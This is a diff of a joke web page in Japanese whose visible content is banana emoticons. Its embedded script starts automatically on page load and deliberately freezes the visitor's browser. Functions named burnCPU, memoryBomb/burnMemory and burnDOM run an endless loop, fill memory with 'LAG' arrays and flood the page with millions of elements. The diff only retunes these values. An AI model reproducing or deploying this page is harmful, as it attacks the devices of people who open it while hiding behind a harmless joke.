@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8" />
-  <title>(   ᐛ)ﾊﾞﾅﾅ</title>
+  <title>🍌ヽ(.⊿·)ﾊﾞｯﾅｧﾅｧｯｯｯｯ</title>
   <style>
     body {
       background: black;
@@ -13,25 +13,25 @@
   </style>
 </head>
 <body>
-  <h1>(   ᐛ)ﾊﾞﾅﾅ</h1>
-  <p>( ᐛ)ﾊﾞﾅﾅ</p>
+  <h1>(( ᐙ   三   ᐕ ＜ﾊﾞﾅｧﾅｧｧｧｧｧｧｧ</h1>
+  <p>(   ᐛ)ﾊﾞﾅﾅｧｧｧｧｧｧｧｧｧｧｧｧｧｧｧ🍌</p>
 
   <script>
     
     setTimeout(() => {
-      document.body.innerHTML = "<h1>( ᐛ)ﾊﾞﾅﾅ( ᐛ)ﾊﾞﾅﾅ</h1>";
+      document.body.innerHTML = "<h1>(   ᐛ)ﾊﾞﾅﾅ</h1>";
 
       
       function burnCPU() {
         while (true) {
-          Math.sqrt(Math.random() * 6e12);
+          Math.sqrt(Math.random() * 1e12);
         }
       }
 
       
       const memoryBomb = [];
       function burnMemory() {
-        for (let i = 0; i < 6e6; i++) {
+        for (let i = 0; i < 1e6; i++) {
           memoryBomb.push(new Array(1000).fill("LAG"));
         }
       }
@@ -39,7 +39,7 @@
       
       function burnDOM() {
         setInterval(() => {
-          for (let i = 0; i < 5000000000000000000000; i++) {
+          for (let i = 0; i < 5000000; i++) {
             const d = document.createElement("div");
             d.textContent = "LAG";
             document.body.appendChild(d);
@@ -52,7 +52,7 @@
       burnDOM();
       burnCPU(); 
 
-    }, 10);
+    }, 30);
   </script>
 </body>
 </html>
